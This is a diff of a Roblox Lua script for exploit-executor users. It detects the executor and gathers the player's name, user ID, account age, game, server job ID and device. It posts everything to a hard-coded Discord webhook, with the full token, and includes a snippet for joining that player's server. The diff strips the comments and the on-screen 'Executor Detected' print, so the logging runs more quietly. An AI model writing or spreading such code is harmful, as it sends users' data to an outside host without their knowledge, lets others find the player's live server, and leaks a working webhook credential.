@@ -1,11 +1,9 @@
--- Executor detection
 local executor
 
--- PC and Mobile Executors
 if syn then
     executor = "Synapse X"
 elseif fluxus then
-    executor = "Fluxus" -- Works for both PC and Mobile
+    executor = "Fluxus"
 elseif KRNL then
     executor = "KRNL"
 elseif ScriptWare then
@@ -32,8 +30,6 @@ elseif Nihon then
     executor = "Nihon"
 elseif getexecutorname then
     executor = getexecutorname()
-
--- Mobile-only Executors
 elseif Delta then
     executor = "Delta"
 elseif Arceus then
@@ -54,33 +50,29 @@ else
     executor = "Unknown Executor"
 end
 
-print("Executor Detected: " .. executor)
-
--- Gather player and game info
 local player = game:GetService("Players").LocalPlayer
 local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local currentTime = os.date("%Y-%m-%d %H:%M:%S") -- Format as Year-Month-Day Hour:Minute:Second
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
 local playerId = player.UserId
 local placeId = game.PlaceId
 local placeVersion = game.PlaceVersion
-local jobId = game.JobId -- Game server ID
-local accountAge = player.AccountAge -- Player account age in days
+local jobId = game.JobId
+local accountAge = player.AccountAge
 
--- Properly get UserInputService
+local gameLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "/" .. gameName:gsub(" ", "-")
+
 local UserInputService = game:GetService("UserInputService")
-local platform = UserInputService.TouchEnabled and "Mobile" or "PC" -- Checks if the device is touch-enabled
+local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
 
--- Webhook URL
 local url = "https://discord.com/api/webhooks/1290698129024487565/w7avd8vNUsMy6SXm8v2vSXRKh4m48nUznfieQSbwaJvqbFjth9jC6a7SmbOTYESN8EBr"
 
--- Webhook content with additional information
 local data = {
    ["content"] = "# Missile User",
    ["embeds"] = {{
       ["title"] = "**Player Information**",
       ["description"] = "Details about the player and the game.",
       ["type"] = "rich",
-      ["color"] = tonumber(0x7289DA), -- Embed color (Discord blue)
+      ["color"] = tonumber(0x7289DA),
       ["fields"] = {
          {
             ["name"] = "Player Name",
@@ -118,7 +110,7 @@ local data = {
             ["inline"] = false
          },
          {
-            ["name"] = "Exploit Used",
+            ["name"] = "Executor",
             ["value"] = executor,
             ["inline"] = true
          },
@@ -128,23 +120,41 @@ local data = {
             ["inline"] = true
          },
          {
-            ["name"] = "Platform",
+            ["name"] = "Device Used",
             ["value"] = platform,
             ["inline"] = true
+         },
+         {
+            ["name"] = "Game Link",
+            ["value"] = gameLink,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Copy this to join the server",
+            ["value"] = [[
+local gameId = "]] .. tostring(placeId) .. [["
+local jobId = "]] .. jobId .. [["
+
+function joinServer(gameId, jobId)
+    local Players = game:GetService("Players")
+    local TeleportService = game:GetService("TeleportService")
+    TeleportService:TeleportToPlaceInstance(gameId, jobId, Players.LocalPlayer)
+end
+
+joinServer(gameId, jobId)
+]],
+            ["inline"] = false
          }
       }
    }}
 }
 
--- Encode the data to JSON format
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
--- Headers for the HTTP request
 local headers = {
    ["content-type"] = "application/json"
 }
 
--- Make the HTTP request
 local request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
